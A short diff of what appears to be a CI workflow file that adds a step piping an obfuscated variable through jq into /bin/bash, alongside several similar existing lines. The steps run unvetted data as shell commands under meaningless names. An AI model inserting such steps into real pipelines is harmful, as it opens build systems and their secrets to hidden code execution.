@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$uzm848" | jq -r .ibwb94 | /bin/bash
           printf '%s' "$t514" | jq -r .w42780 | /bin/bash
           printf '%s' "$lsjbj330" | jq -r .mpsg27178 | /bin/bash
+          echo $dhd372 | jq -r .ufqce0584 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
